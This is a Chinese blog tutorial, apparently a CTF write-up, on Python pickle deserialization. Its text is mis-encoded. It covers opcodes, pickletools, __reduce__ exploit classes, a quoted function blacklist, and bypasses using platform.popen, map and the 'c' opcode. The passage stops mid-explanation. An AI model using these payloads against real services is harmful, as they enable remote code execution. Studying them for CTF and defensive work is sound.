<p>é£ä¸ªæŒ‡ä»¤é›†<del>ä¸ç”¨å…¨çœ‹ï¼Œåæ­£å¾ˆå¤šç”¨ä¸åˆ°ä¹Ÿçœ‹ä¸æ‡‚</del>ï¼Œå¯ä»¥ä»”ç»†çœ‹çœ‹</p>
<pre><code class="highlight plaintext">MARK           = b&#x27;(&#x27;   # push special markobject on stack
STOP           = b&#x27;.&#x27;   # every pickle ends with STOP
POP            = b&#x27;0&#x27;   # discard topmost stack item
POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject
DUP            = b&#x27;2&#x27;   # duplicate top stack item
FLOAT          = b&#x27;F&#x27;   # push float object; decimal string argument
INT            = b&#x27;I&#x27;   # push integer or bool; decimal string argument
BININT         = b&#x27;J&#x27;   # push four-byte signed int
BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int
LONG           = b&#x27;L&#x27;   # push long; decimal string argument
BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int
NONE           = b&#x27;N&#x27;   # push None
PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg
BINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack
REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack
STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument
BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument
SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument
BINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument
APPEND         = b&#x27;a&#x27;   # append stack top to list below it
BUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()
GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string args
DICT           = b&#x27;d&#x27;   # build a dict from stack items
EMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dict
APPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack slice
GET            = b&#x27;g&#x27;   # push item from memo on stack; index is string arg
BINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg
INST           = b&#x27;i&#x27;   # build &amp; push class instance
LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg
LIST           = b&#x27;l&#x27;   # build list from topmost stack items
EMPTY_LIST     = b&#x27;]&#x27;   # push empty list
OBJ            = b&#x27;o&#x27;   # build &amp; push class instance
PUT            = b&#x27;p&#x27;   # store stack top in memo; index is string arg
BINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg
LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg
SETITEM        = b&#x27;s&#x27;   # add key+value pair to dict
TUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack items
EMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tuple
SETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairs
BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding

TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py
FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py</code></pre>

<p>å¸¸ç”¨çš„å…¶å®å°±ä¸‹é¢å‡ ç§ï¼Œä»”ç»†ä»‹ç»ä¸€ä¸‹</p>
<table>
<thead>
<tr>
<th>æŒ‡ä»¤</th>
<th>æè¿°</th>
<th>å…·ä½“å†™æ³•</th>
<th>æ ˆä¸Šçš„å˜åŒ–</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—</td>
<td>c[module]\n[instance]\n</td>
<td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td>o</td>
<td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td>
<td>o</td>
<td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td>
</tr>
<tr>
<td>i</td>
<td>ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td>
<td>i[module]\n[callable]\n</td>
<td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td>
</tr>
<tr>
<td>N</td>
<td>å®ä¾‹åŒ–ä¸€ä¸ªNone</td>
<td>N</td>
<td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td>S</td>
<td>å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td>
<td>Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€&#39;ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td>
<td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td>V</td>
<td>å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td>
<td>Vxxx\n</td>
<td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td>I</td>
<td>å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td>
<td>Ixxx\n</td>
<td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td>F</td>
<td>å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td>
<td>Fx.x\n</td>
<td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td>R</td>
<td>é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td>
<td>R</td>
<td>å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td>
</tr>
<tr>
<td>.</td>
<td>ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td>
<td>.</td>
<td>æ— </td>
</tr>
<tr>
<td>(</td>
<td>å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td>
<td>(</td>
<td>MARKæ ‡è®°å…¥æ ˆ</td>
</tr>
<tr>
<td>t</td>
<td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td>
<td>t</td>
<td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td>)</td>
<td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td>
<td>)</td>
<td>ç©ºå…ƒç»„å…¥æ ˆ</td>
</tr>
<tr>
<td>l</td>
<td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td>
<td>l</td>
<td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td>]</td>
<td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td>
<td>]</td>
<td>ç©ºåˆ—è¡¨å…¥æ ˆ</td>
</tr>
<tr>
<td>d</td>
<td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td>
<td>d</td>
<td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td>}</td>
<td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td>
<td>}</td>
<td>ç©ºå­—å…¸å…¥æ ˆ</td>
</tr>
<tr>
<td>p</td>
<td>å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td>
<td>pn\n</td>
<td>æ— </td>
</tr>
<tr>
<td>g</td>
<td>å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td>
<td>gn\n</td>
<td>å¯¹è±¡è¢«å‹æ ˆ</td>
</tr>
<tr>
<td>0</td>
<td>ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td>
<td>0</td>
<td>æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td>
</tr>
<tr>
<td>b</td>
<td>ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td>
<td>b</td>
<td>æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td>
</tr>
<tr>
<td>s</td>
<td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td>
<td>s</td>
<td>ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td>
</tr>
<tr>
<td>u</td>
<td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td>
<td>u</td>
<td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td>
</tr>
<tr>
<td>a</td>
<td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td>
<td>a</td>
<td>æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td>
</tr>
<tr>
<td>e</td>
<td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td>
<td>e</td>
<td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td>
</tr>
</tbody></table>
<p>æ¥ä¸ªå®ä¾‹</p>
<p>è€Œè¿™äº›æŒ‡ä»¤é›†å°±æ˜¯ç»„æˆopcodeçš„å…³é”®</p>
<p>æ¯”å¦‚ä¸‹é¢è¿™æ®µç¤ºä¾‹ä»£ç </p>
<pre><code class="highlight python"><span class="keyword">import</span> os
os.system(<span class="string">&#x27;ls&#x27;</span>)</code></pre>

<p>ç”¨opcodeè¡¨ç¤ºå¯ä»¥è¿™æ ·è¡¨ç¤º</p>
<pre><code class="highlight plaintext">cos 
system #å¼•å…¥os.sysytem,å‹å…¥æ ˆ
(S&#x27;ls&#x27; #å‹å…¥ä¸€ä¸ªMARKï¼Œå†å‹å…¥å­—ç¬¦ä¸²ls
tR. #tæŠŠæœ€åä¸€ä¸ªMARKå¤„çš„å…ƒç´ åŒ…è£…æˆå…ƒç»„å…¥æ ˆ
#RæŠŠå…ƒç»„ä½œä¸ºos.systemçš„å‚æ•°ï¼Œæœ€å.è¿è¡Œ</code></pre>

<p>è¿™è¾¹ç»™ä¸¤ä¸ªå·¥å…·å¸®åŠ©æˆ‘ä»¬è°ƒè¯•</p>
<h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a><strong>pickletools</strong></h3><p>pickletoolsæ˜¯pythonè‡ªå¸¦çš„pickleè°ƒè¯•å™¨ï¼Œæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼šåæ±‡ç¼–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²ã€ä¼˜åŒ–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²ã€è¿”å›ä¸€ä¸ªè¿­ä»£å™¨æ¥ä¾›ç¨‹åºä½¿ç”¨ã€‚æˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨å‰ä¸¤ç§</p>
<p>è¿˜æ˜¯ç”¨ä¸Šé¢é‚£ä¸ªä»£ç ï¼Œä½†æ˜¯æœ€åä¸€è¡ŒåŠ ä¸€ä¸ª<code>pickletools.dis(pickle.dumps(x))</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513145648001.png" alt="image-20250513145648001"></p>
<p>ç®€å•æ˜“æ‡‚å¯¹å§</p>
<p>ä½†æ˜¯å®é™…ä¸Šè¿™ç§å†™æ³•æ˜¯è¿˜å¯ä»¥å†ç®€åŒ–çš„ï¼Œå› ä¸ºæˆ‘ä»¬å®é™…ä¸Šå¯ä»¥<strong>æŠŠä¸å¿…è¦çš„<code>PUT</code>æŒ‡ä»¤ç»™åˆ é™¤æ‰ã€‚</strong>è¿™ä¸ª<code>PUT</code>æ„æ€æ˜¯æŠŠå½“å‰æ ˆçš„æ ˆé¡¶å¤åˆ¶ä¸€ä»½ï¼Œæ”¾è¿›å‚¨å­˜åŒºâ€”â€”å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬è¿™ä¸ªclasså¹¶ä¸éœ€è¦è¿™ä¸ªæ“ä½œï¼Œå¯ä»¥çœç•¥æ‰è¿™äº›<code>PUT</code>æŒ‡ä»¤ã€‚</p>
<p>ä½¿ç”¨<code>pickletools.optimize</code>æ¥ç®€åŒ–ï¼Œåˆ å»ä¸éœ€è¦çš„BINPUTæ“ä½œ</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">import</span> pickletools
<span class="keyword">class</span> <span class="title class_">myday</span>():
	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):
		<span class="variable language_">self</span>.task=<span class="string">&#x27;ctf&#x27;</span>
		<span class="variable language_">self</span>.sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))
y=pickletools.optimize(pickle.dumps(x))
pickletools.dis(y)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513150109996.png" alt="image-20250513150109996"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç¡®å®ç®€åŒ–äº†ä¸å°‘</p>
<p> PS: ä½¿ç”¨<code>pickletools.dis</code>åˆ†æä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœ<code>.</code>æ‰§è¡Œå®Œæ¯•ä¹‹åæ ˆé‡Œé¢è¿˜æœ‰ä¸œè¥¿ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼›è€Œ<code>pickle.loads</code>æ²¡æœ‰è¿™ä¹ˆä¸¥æ ¼çš„æ£€æŸ¥â€”â€”å®ƒä¼šæ­£å¸¸ç»“æŸã€‚å¤§å®¶åº”è¯¥éƒ½çŸ¥é“ååºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ‹¼æ¥å§ã€‚ï¼ˆä¸çŸ¥é“å¯ä»¥å»çœ‹çœ‹BUUCTFçš„piapiapiaè¿™é“é¢˜ï¼‰ã€‚é€šè¿‡è¿™ç§æ–¹å¼æˆ‘ä»¬å°±æœ‰å¯èƒ½å®ç°ååºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ‹¼æ¥ã€‚</p>
<h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><h3 id="ä¸‡æ¶ä¹‹æºâ€“-reduce-æ–¹æ³•"><a href="#ä¸‡æ¶ä¹‹æºâ€“-reduce-æ–¹æ³•" class="headerlink" title="ä¸‡æ¶ä¹‹æºâ€“__reduce__æ–¹æ³•"></a>ä¸‡æ¶ä¹‹æºâ€“<code>__reduce__</code>æ–¹æ³•</h3><p><code>__reduce__</code>å¯¹åº”çš„æŒ‡ä»¤ç å³ä¸ºR</p>
<p>å®ƒçš„ä½œç”¨å¦‚ä¸‹</p>
<pre><code class="highlight plaintext">å–å½“å‰æ ˆçš„æ ˆé¡¶è®°ä¸ºargsï¼Œç„¶åæŠŠå®ƒå¼¹æ‰ã€‚
å–å½“å‰æ ˆçš„æ ˆé¡¶è®°ä¸ºfï¼Œç„¶åæŠŠå®ƒå¼¹æ‰ã€‚
ä»¥argsä¸ºå‚æ•°ï¼Œæ‰§è¡Œå‡½æ•°fï¼ŒæŠŠç»“æœå‹è¿›å½“å‰æ ˆã€‚</code></pre>

<p>classçš„<code>__reduce__</code>æ–¹æ³•ï¼Œåœ¨pickleååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«æ‰§è¡Œã€‚å…¶åº•å±‚çš„ç¼–ç æ–¹æ³•ï¼Œå°±æ˜¯åˆ©ç”¨äº†<code>R</code>æŒ‡ä»¤ç ã€‚ <code>f</code>è¦ä¹ˆè¿”å›å­—ç¬¦ä¸²ï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªtupleï¼Œåè€…å¯¹æˆ‘ä»¬è€Œè¨€æ›´æœ‰ç”¨ã€‚</p>
<p>ã€€ã€€ä¸€ç§å¾ˆæµè¡Œçš„æ”»å‡»æ€è·¯æ˜¯ï¼šåˆ©ç”¨ <code>__reduce__</code> æ„é€ æ¶æ„å­—ç¬¦ä¸²ï¼Œå½“è¿™ä¸ªå­—ç¬¦ä¸²è¢«ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œ<code>__reduce__</code>ä¼šè¢«æ‰§è¡Œã€‚ç½‘ä¸Šå·²ç»æœ‰æµ·é‡çš„æ–‡ç« è°ˆè®ºè¿™ç§æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œä¸è¿‡å¤šè®¨è®ºã€‚åªç»™å‡ºä¸€ä¸ªä¾‹å­ï¼šæ­£å¸¸çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–åï¼Œå¾—åˆ°ä¸€ä¸ª<code>Student</code>å¯¹è±¡ã€‚æˆ‘ä»¬æƒ³æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œæ‰§è¡Œ<code>ls /</code>æŒ‡ä»¤</p>
<p>å¹¶ä¸”åªè¦ä½ çš„åºåˆ—åŒ–ç»“æœä¸­æœ‰è¿™ä¸ªRï¼Œæ¶æ„æ„é€ å°±ä¸å¯é¿å…</p>
<p>è¦æ˜¯æ‹¿PHPæ¥ç±»æ¯”çš„è¯ï¼Œå…¶å®å°±å’Œ_wakeupä¸€æ ·ï¼Œæ˜¯æ•´ä¸ªååºåˆ—åŒ–æŸç§æ„ä¹‰ä¸Šçš„å‡ºå£</p>
<p>é‚£æˆ‘é—®ä½ ï¼Œé‚£æˆ‘é—®ä½ ï¼Œæˆ‘æŠŠRç¦æ‰äº†æ€ä¹ˆåŠ</p>
<h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><h4 id="ç»•è¿‡å‡½æ•°é»‘åå•"><a href="#ç»•è¿‡å‡½æ•°é»‘åå•" class="headerlink" title="ç»•è¿‡å‡½æ•°é»‘åå•"></a>ç»•è¿‡å‡½æ•°é»‘åå•</h4><p>ã€€æœ‰ä¸€ç§è¿‡æ»¤æ–¹å¼ï¼šä¸ç¦æ­¢<code>R</code>æŒ‡ä»¤ç ï¼Œä½†æ˜¯å¯¹<code>R</code>æ‰§è¡Œçš„å‡½æ•°æœ‰é»‘åå•é™åˆ¶ã€‚å…¸å‹çš„ä¾‹å­æ˜¯2018-XCTF-HITB-WEB : Pythonâ€™s-Revengeã€‚ç»™äº†å¥½é•¿å¥½é•¿ä¸€ä¸²é»‘åå•ï¼š</p>
<pre><code class="highlight text">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</code></pre>

<p>ã€€ã€€å¯æƒœ<code>platform.popen()</code>ä¸åœ¨åå•é‡Œï¼Œå®ƒå¯ä»¥åšåˆ°ç±»ä¼¼<code>system</code>çš„åŠŸèƒ½ã€‚è¿™é¢˜æ­»äºé»‘åå•æœ‰æ¼ç½‘ä¹‹é±¼ã€‚</p>
<p>ã€€ã€€å¦å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªè§£ï¼ˆä¼°è®¡æ˜¯å‡ºé¢˜äººçš„é¢„æœŸè§£ï¼‰ï¼Œé‚£å°±æ˜¯åˆ©ç”¨mapæ¥å¹²è¿™ä»¶äº‹ï¼š</p>
<pre><code class="highlight text">class Exploit(object):
    def __reduce__(self):
 	return map,(os.system,[&quot;ls&quot;])</code></pre>

<p>ã€€ã€€æ€»ä¹‹ï¼Œé»‘åå•ä¸å¯å–ã€‚è¦ç¦æ­¢reduceè¿™ä¸€å¥—æ–¹æ³•ï¼Œæœ€ç¨³å¦¥çš„æ–¹å¼æ˜¯ç¦æ­¢æ‰<code>R</code>è¿™ä¸ªæŒ‡ä»¤ç ã€‚</p>
<h4 id="å…¨å±€å˜é‡åŒ…å«ï¼šcæŒ‡ä»¤ç çš„å¦™ç”¨"><a href="#å…¨å±€å˜é‡åŒ…å«ï¼šcæŒ‡ä»¤ç çš„å¦™ç”¨" class="headerlink" title="å…¨å±€å˜é‡åŒ…å«ï¼šcæŒ‡ä»¤ç çš„å¦™ç”¨"></a>å…¨å±€å˜é‡åŒ…å«ï¼š<code>c</code>æŒ‡ä»¤ç çš„å¦™ç”¨</h4><p>ã€€ã€€æœ‰è¿™ä¹ˆä¸€é“é¢˜ï¼Œå½»åº•è¿‡æ»¤äº†<code>R</code>æŒ‡ä»¤ç ï¼ˆå†™æ³•æ˜¯ï¼šåªè¦è§åˆ°payloadé‡Œé¢æœ‰<code>R</code>è¿™ä¸ªå­—ç¬¦ï¼Œå°±ç›´æ¥é©³å›ï¼Œç®€å•ç²—æš´ï¼‰ã€‚ç°åœ¨çš„ä»»åŠ¡æ˜¯ï¼šç»™å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ<strong>ååºåˆ—åŒ–ä¹‹åï¼Œnameå’Œgradeéœ€è¦ä¸blueè¿™ä¸ªmoduleé‡Œé¢çš„nameã€gradeç›¸å¯¹åº”</strong>ã€‚</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-b42656fa4b3c95eaee8c37dccacad636_1440w.jpg" alt="img"></p>
<p>ç›®æ ‡æ˜¯å–å¾—well done</p>
<p>ã€€ã€€ä¸èƒ½ç”¨<code>R</code>æŒ‡ä»¤ç äº†ï¼Œä¸è¿‡æ²¡å…³ç³»ã€‚è¿˜è®°å¾—æˆ‘ä»¬çš„<code>c</code>æŒ‡ä»¤ç å—ï¼Ÿå®ƒä¸“é—¨ç”¨æ¥è·å–ä¸€ä¸ªå…¨å±€å˜é‡ã€‚æˆ‘ä»¬å…ˆå¼„ä¸€ä¸ªæ­£å¸¸çš„Studentæ¥çœ‹çœ‹åºåˆ—åŒ–ä¹‹åçš„æ•ˆæœï¼š</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-8b0cb8c071dadcde37abdce434a8f180_1440w.jpg" alt="img"></p>
<p>ã€€ã€€å¦‚ä½•ç”¨<code>c</code>æŒ‡ä»¤æ¥æ¢æ‰è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²å‘¢ï¼Ÿä»¥nameçš„ä¸ºä¾‹ï¼Œåªéœ€è¦æŠŠç¡¬ç¼–ç çš„<code>rxz</code>æ”¹æˆä»<code>blue</code>å¼•å…¥çš„<code>name</code>ï¼Œå†™æˆæŒ‡ä»¤å°±æ˜¯ï¼š<code>cblue\nname\n</code>ã€‚æŠŠç”¨äºç¼–ç <code>rxz</code>çš„<code>X\x03\x00\x00\x00rxz</code>æ›¿æ¢æˆæˆ‘ä»¬çš„è¿™ä¸ªglobalæŒ‡ä»¤ï¼Œæ¥çœ‹çœ‹æ”¹é€ ä¹‹åçš„æ•ˆæœï¼š</p>
